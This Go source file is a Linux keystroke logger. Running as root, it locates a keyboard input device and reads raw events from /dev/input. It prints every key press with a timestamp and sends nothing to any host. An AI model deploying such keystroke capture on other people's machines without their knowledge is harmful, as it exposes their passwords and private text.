package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

/*
+                       16                      +  2  +  2  +     4     +
|          sec          +         µsec          |     |     |           |
+-----------------------------------------------------------------------+
| 0| 1| 2| 3| 4| 5| 6| 7| 8| 9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|
+-----------------------------------------------------------------------+
|                                               |     |     |           |
+                    timeval                    +type + code+    value  +
*/

const (
	listDeviceEventFile = "/proc/bus/input/devices"
	eventPath           = "/dev/input"
)

type Io struct {
	vendor  string
	product string
}

type InputDevice struct {
	io       Io
	name     string
	event    string
	isKeyReq bool
}

// Event represents the comment above
type Event struct {
	Time  time.Time
	Type  uint16
	Code  uint16
	Value int32
}

func main() {
	if isRoot() {
		devices, err := readInputDevices()
		if err != nil {
			log.Fatal(err)
		}
		event := getKeyboardEvent(devices)
		if err := getKeyStrokes(event); err != nil {
			log.Fatal(err)
		}
	} else {
		log.Fatal(errNotRoot)
	}
}

func isRoot() bool {
	if os.Getuid() > 0 {
		return false
	}
	return true
}

func readInputDevices() ([]InputDevice, error) {
	var availableDevices []InputDevice
	fd, err := os.Open(listDeviceEventFile)
	if err != nil {
		return availableDevices, err
	}
	defer fd.Close()
	scanner := bufio.NewScanner(fd)

	singleInputDevice := &InputDevice{}
	for scanner.Scan() {
		if line := scanner.Text(); line != "" {
			parseInputDevice(line, singleInputDevice)
		} else {
			availableDevices = append(availableDevices, *singleInputDevice)
		}
	}
	return availableDevices, nil
}

func parseInputDevice(line string, inputDev *InputDevice) {
	indicator := strings.Trim(string(line[0]), ":")
	switch indicator {
	case "I":
		io := &Io{}
		vendor := strings.Split(strings.Split(line, " ")[2], "=")[1]
		product := strings.Split(strings.Split(line, " ")[3], "=")[1]
		io.vendor, io.product = vendor, product
		inputDev.io = *io
	case "N":
		name := strings.Split(line, "=")[1]
		inputDev.name = name
	case "H":
		splittedLine := strings.Split(strings.TrimSpace(line), " ")
		if strings.Contains(line, "sysrq") {
			inputDev.isKeyReq = true
		} else {
			inputDev.isKeyReq = false
		}
		event := splittedLine[len(splittedLine)-1]
		inputDev.event = event
	}
}

func getKeyboardEvent(inputDevices []InputDevice) (event string) {
	for _, d := range inputDevices {
		if d.isKeyReq && d.event != "" {
			event = d.event
		}
	}
	return
}

func getKeyStrokes(event string) error {
	eventFile := filepath.Join(eventPath, event)
	buffer := make([]byte, 24)
	f, err := os.Open(eventFile)
	if err != nil {
		return err
	}
	defer f.Close()
	for {
		_, err := f.Read(buffer)
		if err != nil {
			return err
		}
		ev, err := parseEvent(buffer)
		if err != nil {
			return err
		}
		if ev.Type == 1 && ev.Value == 1 {
			fmt.Printf("[%v] %s\n", ev.Time, keys[ev.Code])
		}
	}
}

func parseEvent(buffer []byte) (Event, error) {
	var value int32
	sec := binary.LittleEndian.Uint64(buffer[0:8])
	usec := binary.LittleEndian.Uint64(buffer[8:16])
	time := time.Unix(int64(sec), int64(usec)*1000)
	typ := binary.LittleEndian.Uint16(buffer[16:18])
	code := binary.LittleEndian.Uint16(buffer[18:20])
	if err := binary.Read(bytes.NewReader(buffer[20:]), binary.LittleEndian, &value); err != nil {
		return Event{}, err
	}
	return Event{
		Time:  time,
		Type:  typ,
		Code:  code,
		Value: value,
	}, nil
}
